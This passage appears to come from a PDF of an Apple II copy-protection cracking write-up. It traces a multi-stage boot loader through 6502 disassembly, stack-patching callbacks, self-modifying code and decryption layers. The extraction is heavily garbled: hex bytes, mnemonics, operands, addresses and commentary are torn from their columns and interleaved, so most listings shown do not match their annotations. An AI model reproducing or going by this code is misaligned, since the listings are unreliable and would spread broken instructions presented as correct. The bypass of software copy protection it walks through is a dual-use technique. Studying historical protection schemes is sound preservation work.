21D0 2F 01 FF 03 FF 04 4F 04
next return address
$012F + 1 = $0130, which is already in memory at
$2130.
Oh joy. Code on the stack. (Remember, the “s-
tack” is just a page in main memory. If you want to
use that page for something else, it’s up to you to
ensure that it doesn’t conflict with the stack func-
tioning as a stack.)
*2130L
2130
2132
2134
2136
2138
A2
86
A0
84
86
04
86
00
83
84
LDX
STX
LDY
STY
STX
Wait, what? Ah, we’re using the same trick we
used to call this routine—the stack has been pre-
filled with a series of “return” addresses. It’s time to
“return” to the next one.
#$04
$86
#$00
$83
$84
*21D0.
21D0 2F 01 FF 03 FF 04 4F 04
next return address
Now ($83) points to $0400.
213A
A6 2B
LDX $2B get slot number (x16)
213C
213F
2141
2143
2145
2148
214A
214C
214E
2151
2153
2155 BD 8C
10
C9
D0
BD 8C
10
C9
D0
BD 8C
10
C9
D0 C0
FB
BF
F7
C0
FB
D7
F3
C0
FB
D5
F3 LDA
BPL
CMP
BNE
LDA
BPL
CMP
BNE
LDA
BPL
CMP
BNE $C08C,X
$213C
#$BF
$213C
$C08C,X
$2145
#$D7
$2141
$C08C,X
$214E
#$D5
$214A find a 3-nibble prologue (“BF
D7 D5”)
2157
215A
215C
215D
215F
2162
2164 BD 8C C0
10 FB
2A
85 85
BD 8C C0
10 FB
25 85 LDA
BPL
ROL
STA
LDA
BPL
AND $C08C,X
$2157 read 4-4-encoded data
2166
2168
2169 91 83
C8
D0 EC 216B
216E
2171
2173
2175 0E 00 C0
BD 8C C0
10 FB
C9 D4
D0 B9 2177 E6 84 INC $84 increment target memory
page
2179
217B C6 86
D0 DA DEC $86
BNE $2157 decrement sector count
(initialized at $0132)
217D 60 RTS exit via RTS
$03FF + 1 = $0400, and that’s where I get to in-
terrupt the boot.
Seek And Ye Shall Find
*BLOAD TRACE2
.
. [same as previous
.
9705
84 48
STY
9707
A0 00
LDY
9709 B9 00 03
LDA
970C
45 48
EOR
970E 99 00 01
STA
9711
C8
INY
9712
D0 F5
BNE
$85
$C08C,X
$215F
$85
STA ($83),Y
INY
BNE $2157 store in $0400 (text page, but
it’s hidden right now because
we switched to hi-res graphics
screen 2 at $0314)
ASL
LDA
BPL
CMP
BNE find a 1-nibble epilogue (“D4”)
$C000
$C08C,X
$216E
#$D4
$2130
9714
9716
9719
971B
971E
9720
9721
9722
9724
9726
9729
972C
972D
972F
9732
9735
9736
29
A9
8D D2
A9
8D D3
21
01
97
01
A2 CF
9A
60
A2
A0
B9 00
99 00
D0
EE 28
EE 2B
D0
04
00
04
24
C8
F7
97
97
CA
EE
LDA
STA
LDA
STA
trace]
$48
#$00
$0300,Y
$48
$0100,Y
reproduce the decryption loop
that was originally at $0320
$9709
#$21
$01D2
#$97
$01D3
now that the stack is in place
at $0100, change the first
return address so it points to
a callback under my control
(instead of continuing to
$0400)
LDX #$CF
TXS
RTS continue the boot
LDX
LDY
LDA
STA
INY
BNE
INC
INC
DEX
BNE (callback is here) copy the
contents of the text page to
higher memory
#$04
#$00
$0400,Y
$2400,Y
$9726
$9728
$972B
$97269738
973B
AD E8 C0
4C 00 C5
LDA $C0E8
JMP $C500
turn off the drive and reboot
to my work disk
*BSAVE TRACE3,A$9600,L$13E
*9600G
. . .reboots slot 6. . .
. . .reboots slot 5. . .
]BSAVE BOOT1
0400-07FF,A$2400,L$400
]CALL -151
I’m going to leave this code at $2400, since I
can’t put it on the text page and examine it at the
same time. Relative branches will look correct, but
absolute addresses will be off by $2000.
*2400L
2400
2402 B9
2405 99
2408 B9
240B 99
240E B9
2411 99
2414
2415
A0
00
00
00
00
00
00
00
05
BD
06
BE
07
BF
C8
D0 EB
LDY
LDA
STA
LDA
STA
LDA
STA
INY
BNE
#$00
$0500,Y
$BD00,Y
$0600,Y
$BE00,Y
$0700,Y
$BF00,Y
D0
E6
D0
80
C0
C0
00
D0
A0
A1
A0
A0
C8
F9
A1
F5
C0
60
LDA
LDA
LDY
LDA
STY
STA
LDA
STA
INY
BNE
INC
BNE
BIT
RTS
LDA
BIT
BIT
BIT
PHA #$D2
$D0A9
$CCA9
$A1A9 There are multiple entry
points here: $BF00, $BF03,
$BF06, and $BF09 (hidden in
this listing by the “BIT”
opcodes).
BF0C 20 48 BF JSR $BF48 zap the language card again
BF0F
BF12
BF15 20 2F FB
20 58 FC
20 84 FE JSR $FB2F
JSR $FC58
JSR $FE84 TEXT/HOME/NORMAL
BF18
BF19 68
8D 00 04 PLA
STA $0400 Depending on the initial entry
point, this displays a different
character in the top left
corner of the screen
BF1C
BF1E
BF1F
BF22
BF23
BF25 A0 00
98
99 00 BE
C8
D0 FA
CE 21 BF LDY
TYA
STA
INY
BNE
DEC #$00 now wipe all of main memory
BF28
BF2B
BF2E
BF30 2C 30 C0
AD 21 BF
C9 08
B0 EA BIT
LDA
CMP
BCS $C030
$BF21
#$08
$BF1C BF32
BF35 8D F3 03
8D F4 03 STA $03F3
STA $03F4 munge the reset vector
BF38
BF3B
BF3C
BF3D
BF3E
BF3F
BF41
BF43
BF44
BF46
BF47 AD 66 BF
4A
4A
4A
4A
09 C0
E9 00
48
A9 FF
48
60 LDA
LSR
LSR
LSR
LSR
ORA
SBC
PHA
LDA
PHA
RTS and reboot from whence we
came
$BE00,Y
$BF1F
$BF21
$2402
*FE89G FE93G ; disconnect DOS
*BD00<2500.27FFM ; simulate
copy loop
2417
A6 2B
LDX $2B
2419 8E 66 BF
STX $BF66
241C 20 48 BF
JSR $BF48
81
81
A0
A9
84
85
B1
91
A9 D2
2C A9 D0
2C A9 CC
2C A9 A1
48
copy three pages to the top of
main memory
I can replicate that.
*BF48L
BF48 AD
BF4B AD
BF4E
BF50
BF52
BF54
BF56
BF58
BF5A
BF5B
BF5D
BF5F
BF61 2C
BF64
BF00
BF02
BF05
BF08
BF0B
$C081
$C081
#$00
#$D0
$A0
$A1
($A0),Y
($A0),Y
zap contents of language card
$BF56
$A1
$BF56
$C080
$BF66
while playing a sound
#$C0
#$00
#$FF
Yeah, let’s try not to end up there.
Continuing from $041F. . .
Continuing from $0446. . .
241F
2422
2425
2427
2429
242C
242F
2432
2435
2437
243A
243D
243F
2441
2443
AD 83 C0
AD 83 C0
A0 00
A9 BF
8C FC FF
8D FD FF
8C F2 03
8D F3 03
A0 03
8C F0 03
8D F1 03
84 38
85 39
49 A5
8D F4 03
LDA
LDA
LDY
LDA
STY
STA
STY
STA
LDY
STY
STA
STY
STA
EOR
STA
$C083
$C083
#$00
#$BF
$FFFC
$FFFD
$03F2
$03F3
#$03
$03F0
$03F1
$38
$39
#$A5
$03F4
set low-level reset vectors and
page 3 vectors to point to
$BF00—presumably The
Badlands (from which there is
no return)
2446
2448
A9 07
20 00 BE
LDA #$07
JSR $BE00
*BE00L
*BF00L
30
LDX #$13 entry point #1
2C A2 0A BIT $0AA2 entry point #2 (hidden
behind a BIT opcode, but it’s
“LDX #$0A”)
8E 6E BE STX $BE6E ! modify the code later
based on which entry point
we called
BE00 A2 13
BE02 BE05BE08
BE0B
BE0E
BE10
BE12
BE15
BE18
BE1B
BE1C
BE1F
BE21
BE23
BE25
BE28
BE2A
BE2C
BE2F
BE32
BE34
BE37
BE39
BE3B
BE3C
BE3D
BE40
BE43
BE46
BE49
BE4A
BE4D
BE50
BE53
BE56
BE58
BE5B
BE5C
BE5F
BE61
BE62
BE65
BE66
BE69
BE6C
8D 90 BE
CD 65 BF
F0 59
A9 00
8D 91 BE
AD 65 BF
8D 92 BE
38
ED 90 BE
F0 37
B0 07
49 FF
EE 65 BF
90 05
69 FE
CE 65 BF
CD 91 BE
90 03
AD 91 BE
C9 0C
B0 01
A8
38
20 5C BE
B9 78 BE
20 6D BE
AD 92 BE
18
20 5F BE
B9 84 BE
20 6D BE
EE 91 BE
D0 BD
20 6D BE
18
AD 65 BF
29 03
2A
0D 66 BF
AA
BD 80 C0
AE 66 BF
60
STA
CMP
BEQ
LDA
STA
LDA
STA
SEC
SBC
BEQ
BCS
EOR
INC
BCC
ADC
DEC
CMP
BCC
LDA
CMP
BCS
TAY
SEC
JSR
LDA
JSR
LDA
CLC
JSR
LDA
JSR
INC
BNE
JSR
CLC
LDA
AND
ROL
ORA
TAX
LDA
LDX
RTS
$BE90
$BF65
$BE69
#$00
$BE91
$BF65
$BE92
The rest of this routine is a
garden variety drive seek. The
target phase (track x 2) is in
the accumulator on entry.
244B
244D
244F
2451
2453
2455
2457
2459
$BE90
$BE58
$BE2A
#$FF
$BF65
$BE2F
#$FE
$BF65
$BE91
$BE37
$BE91
#$0C
$BE3C
A9
85
A2
86
A0
A5
84
85
05
33
03
36
00
33
34
35
LDA
STA
LDX
STX
LDY
LDA
STY
STA
#$05
$33
#$03
$36
#$00
$33
$34
$35
Now ($34) points to $0500.
$BE5C
$BE78,Y
$BE6D
$BE92
$BE5F
$BE84,Y
$BE6D
$BE91
$BE15
$BE6D
$BF65
#$03
$BF66
$C080,X
$BF66
BE6D
A2 13
LDX #$13
(value of X may be modified
BE6F
CA
DEX
depending on which entry
BE70
D0 FD
BNE $BE6F
point was called)
BE72
38
SEC
BE73
E9 01
SBC #$01
BE75
D0 F6
BNE $BE6D
BE77
60
RTS
BE78 [01 30 28 24 20 1E 1D 1C]
BE80 [1C 1C 1C 1C 70 2C 26 22]
BE88 [1F 1E 1D 1C 1C 1C 1C 1C]
The fact that there are two entry points is in-
teresting. Calling $BE00 will set X to #$13, which
will end up in $BE6E, so the wait routine at $BE6D
will wait long enough to go to the next phase (a.k.a.
half a track). Nothing unusual there; that’s how all
drive seek routines work. But calling $BE03 instead
of $BE00 will set X to #$0A, which will make the wait
routine burn fewer CPU cycles while the drive head
is moving, so it will only move half a phase (a.k.a. a
quarter track). That is potentially very interesting.
245B
245E
2461
2463
2465
2467
246A
246C
246E
2470
2473
2475
2477 AE 66 BF
BD 8C C0
10 FB
C9 B5
D0 F7
BD 8C C0
10 FB
C9 DE
D0 F3
BD 8C C0
10 FB
C9 F7
D0 F3 LDX
LDA
BPL
CMP
BNE
LDA
BPL
CMP
BNE
LDA
BPL
CMP
BNE $BF66
$C08C,X
$245E
#$B5
$245E
$C08C,X
$2467
#$DE
$2463
$C08C,X
$2470
#$F7
$246C find a 3-nibble prologue (“B5
DE F7”)
2479
247C
247E
247F
2481
2484
2486
2488
248A
248B
248B
248D BD 8C C0
10 FB
2A
85 37
BD 8C C0
10 FB
25 37
91 34
C8
D0 EC
D0 EC
0E FF FF LDA
BPL
ROL
STA
LDA
BPL
AND
STA
INY
BNE
BNE
ASL $C08C,X
$2479 read 4-4-encoded data into
$0500+
2490
2493
2495
2497
2499 BD 8C
10
C9
D0
E6 LDA
BPL
CMP
BNE
INC $C08C,X
$2490
#$D5
$244F
$35
C0
FB
D5
B6
35
249B
249D C6 36
D0 DA
249F 60
$37
$C08C,X
$2481
$37
($34),Y
$2479
$2479
$FFFF
find a 1-nibble epilogue (“D5”)
DEC $36
BNE $2479 3 sectors (initialized at $0451)
RTS and exit via RTS
We’ve read 3 more sectors into $0500+, overwrit-
ing the code we read earlier (but moved to $BD00+),
and once again we simply exit and let the stack tell
us where we’re going next.
*21D0.
21D0 2F 01 FF 03 FF 04 4F 04
next return address
$04FF + 1 = $0500, the code we just read.
And that’s where I get to interrupt the boot.
Continuing from $044B. . .
31Return of the Jedi
2515
2518
251A
251C
251E
2521
2523
2525
2527
252A
252C
252E BD 8C
10
C9
D0
BD 8C
10
C9
D0
BD 8C
10
C9
D0 C0
FB
D5
F0
C0
FB
FF
F3
C0
FB
DD
F3 LDA
BPL
CMP
BNE
LDA
BPL
CMP
BNE
LDA
BPL
CMP
BNE $C08C,X
$2515
#$D5
$250E
$C08C,X
$251E
#$FF
$251A
$C08C,X
$2527
#$DD
$2523 find a 3-nibble prologue (“D5
FF DD”)
2530
2532
2535
2537
2538
2539
253B
253E
2540 A0 00
BD 8C C0
10 FB
38
2A
85 30
BD 8C C0
10 FB
25 30 LDY
LDA
BPL
SEC
ROL
STA
LDA
BPL
AND #$00
$C08C,X
$2532 read 4-4-encoded data
*C500G
...
]CALL -151
*BLOAD TRACE3
.
. [same as previous trace]
. reboot because I disconnected
and overwrote DOS to
examine the previous code
chunk at $BD00+ 9714
9716
9719
971B Patch the stack again, but
slightly later, at $01D4. (The
previous trace patched it at
$01D2.) 2542
2545
2546 99 00 B0
C8
D0 EA STA $B000,Y
INY
BNE $2532 into $B000 (hard-coded here,
was not modified earlier
unless I missed something)
LDX #$CF
TXS
RTS continue the boot 2548
254B
254D
254F BD 8C
10
C9
F0 C0
FB
D5
0B LDA
BPL
CMP
BEQ $C08C,X
$2548
#$D5
$255C find a 1-nibble epilogue (“D5”)
LDX
LDY
LDA
STA
INY
BNE
INC
INC
DEX
BNE (callback is here) We just
executed all the code up to
and including the “RTS” at
$049F, so now let’s copy the
latest code at $0500..$07FF to
higher memory so it survives
a reboot. 2551
2553
2556
2559
255A A0 00
B9 00 07
99 00 B0
C8
D0 F7 LDY
LDA
STA
INY
BNE #$00
$0700,Y
$B000,Y This is odd. If the epilogue
doesn’t match, it’s not an
error. Instead, it appears that
we simply copy a page of data
that we read earlier (at
$0700).
255C 20 F0 05 JSR $05F0 execution continues here
regardless
LDY
LDA
PHA
LDA
PHA
LDA
RTS Weird, but OK. This ends up
calling $BE00 with A=$07,
which will seek to track 3.5.
971E
9720
9721
A9
8D D4
A9
8D D5
21
01
97
01
A2 CF
9A
60
9722
9724
9726
9729
972C
972D
972F
9732
9735
9736 A2
A0
B9 00
99 00
9738
973B AD E8 C0
4C 00 C5
D0
EE 28
EE 2B
D0
04
00
05
25
C8
F7
97
97
CA
EE
LDA
STA
LDA
STA
#$21
$01D4
#$97
$01D5
#$03
#$00
$0500,Y
$2500,Y
$9726
$9728
$972B
$9726
LDA $C0E8
JMP $C500
25F0
25F2
25F4
25F5
25F7
25F8
25FA
*BSAVE TRACE4,A$9600,L$13E
*9600G
. . .reboots slot 6. . .
. . .reboots slot 5. . .
]BSAVE BOOT2
0500-07FF,A$2500,L$300
]CALL -151
Again, I’m going to leave this at $2500 because
I can’t examine code on the text page. Relative
branches will look correct, but absolute addresses
will be off by $2000.
LDA #$02
JSR $BE00 seek to track 1
2505
2508
250A
250C
250E
250F
2511
2513 LDX
LDY
LDA
STA
DEY
BNE
DEC
BEQ get slot number x16 (set a
long time ago, at $0419)
AE 66
A0
A9
85
BF
00
20
30
88
D0 04
C6 30
F0 3C
$BF66
#$00
#$20
$30
$2553
*25F0L
reboot to my work disk
*2500L
2500
A9 02
2502 20 00 BE
$30
$C08C,X
$253B
$30
A0 56
A9 BD
48
A9 FF
48
A9 07
60
#$56
#$BD
#$FF
#$07
And now we’re on half tracks.
Continuing from $055F. . .
255F
2562
2564
2566
2568
256B
256D
256F
2571
2574
2576
2578
$2515
$30
$2551
32
BD 8C
10
C9
D0
BD 8C
10
C9
D0
BD 8C
10
C9
D0
C0
FB
DD
F7
C0
FB
EF
F3
C0
FB
AD
F3
LDA
BPL
CMP
BNE
LDA
BPL
CMP
BNE
LDA
BPL
CMP
BNE
$C08C,X
$255F
#$DD
$255F
$C08C,X
$2568
#$EF
$2564
$C08C,X
$2571
#$AD
$256D
find a 3-nibble prologue ("DD
EF AD")A0 00
BD 8C C0
10 FB
38
2A
85 00
BD 8C C0
10 FB
25 00 LDY
LDA
BPL
SEC
ROL
STA
LDA
BPL
AND 258C 48 PHA push the byte to the stack
(WTF?)
258D
258E 88
D0 EC DEY
BNE $257C repeat for $100 bytes
LDA
BPL
CMP
BNE find a 1-nibble epilogue
("D5")
2590
2593
2595
2597
2599
259C
BD 8C
10
C9
D0
C0
FB
D5
C3
CE 9C 05
61 00
#$00
$C08C,X
$257C
whatever that is.) I get to ensure I don’t disturb
the stack before I save it, so no JSR, PHA, PHP,
or TXS. I think I can manage that. JMP doesn’t
disturb the stack, so that’s safe for the callback.
read a 4-4 encoded byte (two
nibbles on disk = 1 byte in
memory)
257A
257C
257F
2581
2582
2583
2585
2588
258A
$00
$C08C,X
$2585
$00
$C08C,X
$2590
#$D5
$255C
*BLOAD TRACE4
.
. [same as previous
.
9722
A9 4C
LDA
9724 8D 99 05
STA
9727
A9 34
LDA
9729 8D 9A 05
STA
972C
A9 97
LDA
972E 8D 9B 05
STA
9731
9734
9736
9739
973C
973F
9742
9743
DEC $059C !
ADC ($00,X)
! Self-modifying code alert! WOO WOO. I’ll
use this symbol whenever one instruction modifies
the next instruction. When this happens, the dis-
assembly listing is misleading because the opcode
will be changed by the time the second instruction
is executed.
In this case, the DEC at $0599 modifies the op-
code at $059C, so that’s not really an “ADC.” By
the time we execute the instruction at $059C, it will
have been decremented to #$60, a.k.a. “RTS.”
One other thing: we’ve read $100 bytes and
pushed all of them to the stack. The stack is
only $100 bytes ($0100..$01FF), so this completely
obliterates any previous values.
We haven’t changed the stack pointer, though.
That means the “RTS‘” at $059C will still look at
$01D6 to find the next “return” address. That used
to be “4F 04”, but now it’s been overwritten with
new values, along with the rest of the stack. That’s
some serious Jedi mind trick stuff.
“These aren’t the return addresses you’re looking
for.”
“These aren’t the return addresses we’re looking
for.”
“He can go about his bootloader.”
“You can go about your bootloader.”
“Move along.”
“Move along. . . move along.”
9745
9748
4C 00 05
B9
99
B9
99
A0
00
00
00
00
00
B0
20
01
21
C8
D0 F1
AD E8 C0
4C 00 C5
trace]
#$4C
$0599
#$34
$059A
#$97
$059B
set up a JMP $9734 at $0599
JMP $0500 continue the boot
LDY
LDA
STA
LDA
STA
INY
BNE (callback is here) Copy $B000
and $0100 to higher memory
so they survive a reboot
#$00
$B000,Y
$2000,Y
$0100,Y
$2100,Y
$9736
LDA $C0E8
JMP $C500
reboot to my work disk
*BSAVE TRACE5,A$9600,L$14B
*9600G
. . .reboots slot 6. . .
. . .reboots slot 5. . .
]BSAVE BOOT2
B000-B0FF,A$2000,L$100
]BSAVE BOOT2
0100-01FF,A$2100,L$100
]CALL -151
Remember, the stack pointer hasn’t changed. Now
that I have the new stack data, I can just look at the
right index in the captured stack page to see where
the bootloader continues once it issues the “RTS” at
$059C.
*21D0.
21D0 2F 01 FF 03 FF 04 4F 04
next return address
That’s part of the stack page I just captured, so it’s
already in memory.
*2126L
Another disk read routine! The fourth? Fifth?
I’ve truly lost count.
2126
2129
212B
212D
212F
2132
2134
2136
2138
213B
213D
213F
In Which We Move Along
Luckily, there’s plenty of room at $0599. I can insert
a JMP to call back to code under my control, where
I can save a copy of the stack. (And $B000 as well,
33
BD 8C
10
C9
D0
BD 8C
10
C9
D0
BD 8C
10
C9
D0
C0
FB
BF
F7
C0
FB
BE
F3
C0
FB
D4
F3
LDA
BPL
CMP
BNE
LDA
BPL
CMP
BNE
LDA
BPL
CMP
BNE
$C08C,X
$2126
#$BF
$2126
$C08C,X
$212F
#$BE
$212B
$C08C,X
$2138
#$D4
$2134
find a 3-nibble prologue ("BF
BE D4")342141
2143
2146
2148
2149
214A
214D
2150
2152 A0 00
BD 8C C0
10 FB
38
2A
8D 00 02
BD 8C C0
10 FB
2D 00 02 LDY
LDA
BPL
SEC
ROL
STA
LDA
BPL
AND
#$00
$C08C,X
$2143
2155 59 00 01 EOR $0100,Y
*BLOAD TRACE5
*9734<2126.2166M
$0200
$C08C,X
$214D
$0200
Here’s the entire disassembly listing of boot
trace #6:
decrypt the data from disk by
using this entire page of code
(in the stack page) as the
decryption key (more on this
later)
2158
215B
215C 99 00 00
C8
D0 E5 STA $0000,Y
INY
BNE $2143 and store it in zero page
215E
2161
2163
2165 BD 8C
10
C9
D0 C0
FB
D5
BF LDA
BPL
CMP
BNE find a 1-nibble epilogue
("D5")
60 RTS
2167
pendencies, so why not? Then I can capture the de-
crypted zero page and see where that JMP ($0028)
is headed.
read 4-4-encoded data
$C08C,X
$215E
#$D5
$2126
and exit via RTS
And we’re back on the stack again.
*21D0.
21D0 F0 78 AD D8 02 85 25 01
21D8 57 FF 57 FF 57 FF 57 FF
21E0 57 FF 22 01 FF 05 B1 4C
The six 57 FF words and the following 22 01 word
are the next return addresses.
$FF57 + 1 = $FF58, which is a well-known ad-
dress in ROM that is always an “RTS” instruction.
So this will burn through several return addresses
on the stack in short order, then finally arrive at
$0123, in memory at $2123.
*2123L
2123 6C 28 00
A9
8D 38
A9
8D 39 9702 4C 01 08 JMP $0801 start the boot
9705
9707
9709
970C
970E
9711
9712 84
A0
B9 00
45
99 00 STY
LDY
LDA
EOR
STA
INY
BNE $48
#$00
$0300,Y
$48
$0100,Y (callback #1 is here)
reproduce the decryption loop
that was originally at $0320
9714
9716
9719
971B A9
8D D4
A9
8D D5 LDA
STA
LDA
STA #$21
$01D4
#$97
$01D5
971E
9720
9721
JMP ($0028)
. . .which is in the new zero page that was just read
from disk.
And to think, we’ve loaded basically nothing of
consequence yet. The screen is still black. We have
3 pages of code at $BD00..$BFFF. There’s still some
code on the text screen, but who knows if we’ll ever
call it again. Now we’re off to zero page for some
reason.
Un. Be. Lievable.
By Perseverance The Snail Reached
The Ark
I can’t touch the code on the stack, because it’s used
as a decryption key. I mean, I could theoretically
change a few bytes of it, then calculate the proper
decrypted bytes on zero page by hand. But no.
Instead, I’m just going to copy this latest disk
routine wholesale. It’s short and has no external de-
35
05
08
97
08
48
00
03
48
01
C8
D0 F5
21
01
97
01
A2 CF
9A
60
#$05
$0838
#$97
$0839
$9709
patch the stack so it jumps to
my callback #2 instead of
continuing to $0500
LDX #$CF
TXS
RTS continue the boot
LDA
STA
LDA
STA
LDA
STA (callback #2) set up callback
#3 instead of passing control
to the disk read routine at
$0126
9722
9724
9727
9729
972C
972E A9
8D 99
A9
8D 9A
A9
8D 9B 9731 4C 00 05 JMP $0500 continue the boot
9734
9737
9739
973B
973D
9740
9742
9744
9746
9749
974B
974D
974F
9751
9754
9756
9757
9758
975B
975E
9760
9763
9766
9769
976A
976C
976F
9771
9773 BD 8C
10
C9
D0
BD 8C
10
C9
D0
BD 8C
10
C9
D0
A0
BD 8C
10 LDA
BPL
CMP
BNE
LDA
BPL
CMP
BNE
LDA
BPL
CMP
BNE
LDY
LDA
BPL
SEC
ROL
STA
LDA
BPL
AND
EOR
STA
INY
BNE
LDA
BPL
CMP
BNE (callback #3) disk read
routine copied wholesale from
$0126..$0166 that reads a
sector and decrypts it into
zero page
8D 00
BD 8C
10
2D 00
59 00
99 00
D0
BD 8C
10
C9
D0
4C
05
34
05
97
05
LDA
STA
LDA
STA
patch boot0 so it calls my
routine instead of jumping to
$0301
96F8
96FA
96FD
96FF
C0
FB
BF
F7
C0
FB
BE
F3
C0
FB
D4
F3
00
C0
FB
38
2A
02
C0
FB
02
01
00
C8
E5
C0
FB
D5
BF
#$4C
$0599
#$34
$059A
#$97
$059B
$C08C,X
$9734
#$BF
$9734
$C08C,X
$973D
#$BE
$9739
$C08C,X
$9746
#$D4
$9742
#$00
$C08C,X
$9751
$0200
$C08C,X
$975B
$0200
$0100,Y
$0000,Y
$9751
$C08C,X
$976C
#$D5
$9734I guess we’re done with all that code on the stack
page. I mean, I hope we’re done with it, since it all
just disappeared.
execution falls through here
#$00
$0000,Y
$2000,Y
now capture the decrypted
zero page
9775
9777
977A
977D
977E A0 00
B9 00 00
99 00 20
C8
D0 F7 LDY
LDA
STA
INY
BNE 9780 AD E8 C0 LDA $C0E8 turn off the slot 6 drive motor
9783 4C 00 C5 JMP $C500 reboot to my work disk
$9777
2606
2608 A2 FF
9A
2609
260C EE 0C 06
A8
LDX #$FF
TXS
reset the stack pointer
INC $060C !
TAY
*BSAVE TRACE6,A$9600,L$186
*9600G
. . .reboots slot 6. . .
. . .reboots slot 5. . .
]BSAVE BOOT3
0000-00FF,A$2000,L$100
]CALL -151
*2028.2029
2028 D0 06
Whew. Let’s do it.
Oh joy.
OK, the JMP ($0028) points to $06D0, which
I captured earlier. It’s part of the second chunk
we read into the text page. (Not the first chunk—
that was copied to $BD00+ then overwritten.) So
it’s in the “BOOT2 0500-07FF” file, not the “BOOT1
0400-07FF” file.
*BLOAD BOOT2 0500-07FF,A$2500
*26D0L
26D0
A2 00
LDX #$00
26D2 EE D5 06
INC $06D5 !
26D5
C9 EE
CMP #$EE
Oh joy, more self-modifying code.
*26D5:CA
*26D5L
26D5
CA
26D6 EE D9 06
26D9
0F
*26D9:10
*26D9L
26D9
10 FB
26DB CE DE 06
26DE
61 A0
*26DE:60
*26DEL
26DE
*2611:18
*2611L
2611
18
2612 EE 15 06
2615
68 CLC
INC $0615 !
PLA
*2615:69
*2615L
2615
69 D9
2617 EE 1A 06
261A
4B ADC #$D9
INC $061A !
???
*261A:4C
*261AL
261A 4C 90 FD JMP $FD90
Wait, what?
D0 5B
branch is never taken,
because we just DEX’d from
#$00 to #$FF
*FDEDL
FDED 6C 36 00
60
JMP ($0036)
RTS
Of course, this is the standard output character
routine, which routes through the output vector at
($0036). And we just set that vector, along with
the rest of zero page. So what is it?
And now we’re back on the stack.
*21E0.
*21E0. 57 FF 22 01 FF 05 B1 4C
*2036.2037
2036 6F BF
next return address
Oh joy. Let’s see, $BD00..$BFFF was copied ear-
lier from $0500..$07FF, but from the first time we
read into the text page, not the second time we read
into text page. So it’s in the “BOOT1 0400-07FF”
file, not the “BOOT2 0500-07FF” file.
$05FF + 1 = $0600, which is already in memory at
$2600.
A0 00
48
88
D0 FC
BNE $FDED
Despite the fact that the accumulator is #$00
(because #$27 + #$D9 = #$00), the INC at $0617
affects the Z register and causes this branch to be
taken, because the final value of $061A was not zero.
*BLOAD BOOT2 0100-01FF,A$2100
*2600L
2600
2602
2603
2604
LDA #$27
INC $0611 !
???
*FD90L
FD90
DEX
INC $06D9 !
???
BPL $26D6
DEC $06DE !
ADC ($A0,X)
*260C:A9
*260CL
260C
A9 27
260E EE 11 06
2611
17
LDY #$00
PHA
DEY
BNE $2602
destroy stack by pushing the
same value $100 times
*BLOAD BOOT1 0400-07FF,A$2400
*FE89G FE93G
36
disconnect DOS*BD00<2500.27FFM
*BF6FL
BF6F
C9 07
CMP #$07
BF71
90 03
BCC $BF76
BF73 6C 3A 00
JMP ($003A)
move code into place
*203A.203B
203A F0 FD
BF76
85 5F STA $5F save input value
BF78
BF79 A8
B9 68 BF TAY
LDA $BF68,Y use value as an index into an
array
BF7C
BF7F
BF81 8D 82 BF
A9 00
20 D0 BE STA $BF82
LDA #$00
JSR $BED0 ! self-modifying code
alert—this changes the
upcoming JSR at $BF81
This explains why the original disk fills the
screen with a different color every time it boots.
But wait, these commands do so much more than
just fill the screen.
Continuing from $BF84. . .
BF84
BF86
BF88
BF8A
BF8D
BF8F
BF91
BF94
Since A = #$00 this time, the call is unchanged
and we JSR $BED0. Other input values may call
$BEDF or $BEFD instead.
BED9 F0 F5 BEQ $BED0 not #$00
BEDB
BEDD C9 0F
F0 F1 CMP #$0F
BEQ $BED0 not #$0F
BEDF 20 66 F8 JSR $F866 set the lo-res plotting color
(in zero page $30) to the
random-ish value we just
produced
60
C0
60
0F
LDA
EOR
STA
AND
$60
$C050
$60
#$0F
use the "value" of $C050 to
produce a pseudo-random
number between #$01 and
#$0E
LDA #$17
PHA fill the lo-res graphics screen
with blocks of that color
F8
27
30
26
88
10 FB
68 JSR
LDY
LDA
STA
DEY
BPL
PLA calculates the base address for
this line in memory and puts
it in $26/$27
BEF2
BEF3
BEF5 38
E9 01
10 ED SEC
SBC #$01
BPL $BEE4 do it for all 24 ($17) rows of
the screen
BEF7
BEFA
BEFD AD 56 C0
AD 54 C0
60 LDA $C056
LDA $C054
RTS and switch to lo-res graphics
mode
BEE2
BEE4
BEE5
BEE8
BEEA
BEEC
BEEE
BEEF
BEF1
A9 17
48
20 47
A0
A5
91
$F847
#$27
$30
($26),Y
LDA
CMP
BNE
JMP
$5F
#$04
$BF8D
$BD00
C9 05
D0 03
6C 82 BF
CMP #$05
BNE $BF94
JMP ($BF82)
If A = #$05, we exit via ($BF82), which is the
same thing we just called via the self-modified JSR
at $BF81.
For all other values of A, we do this:
*BF68.
BF68 D0 DF D0 D0 FD FD D0
A5
50
85
29
5F
04
03
BD
If A = #$04, we exit via $BD00, which I’ll inves-
tigate later.
Amazing. So this “output” vector does actually
print characters through the standard $FDF0 text
print routine, but only if the character to be printed
is at least #$07. If it’s less than #$07, the “charac-
ter” is treated as a command. Each command gets
routed to a different routine somewhere in $BExx.
The low byte of each routine is stored in the ar-
ray at $BF68, and the “STA” at $BF7C modifies the
“JSR” at $BF81 to call the appropriate address.
*BED0L
BED0
BED2 4D
BED5
BED7
A5
C9
D0
4C 00
20 B0 BE
JSR $BEB0
*BEB0L
BEB0
A2 60
BEB2 BD 9F BF
BEB5 5D 00 BE LDX #$60
LDA $BF9F,X
EOR $BE00,X another layer of encryption!
BEB8
BEBB
BEBC
BEBE
BEC1 STA $BF9F,X
DEX
BPL $BEB2
LDX $BF66
RTS and it’s decrypting the code
that we’re about to run
9D 9F BF
CA
10 F4
AE 66 BF
60
This is self-contained, so I can just run it right
now and see what ends up at $BF9F.
*BEB0G
Continuing from $BF97. . .
$BEEC
37
BF97
BF99
BF9B
BF9D A0
A9
84
85
00
B2
44
45
BF9F BD 89 C0 LDA $C089,X everything beyond this point
was encrypted, but we just
decrypted it in $BEB0
BFA2
BFA5
BFA7
BFA9
BFAB
BFAE
BFB0
BFB2
BFB4
BFB7
BFB9
BFBB BD 8C
10
C5
D0
BD 8C
10
C5
D0
BD 8C
10
C5
D0 LDA
BPL
CMP
BNE
LDA
BPL
CMP
BNE
LDA
BPL
CMP
BNE find a 3-nibble prologue
(varies, based on whatever
the hell is in zero page
$40/$41/$42 at this point)
C0
FB
40
F7
C0
FB
41
F3
C0
FB
42
F3
LDY
LDA
STY
STA
#$00
#$B2
$44
$45
$C08C,X
$BFA2
$40
$BFA2
$C08C,X
$BFAB
$41
$BFA7
$C08C,X
$BFB4
$42
$BFB0BFBD
BFC0
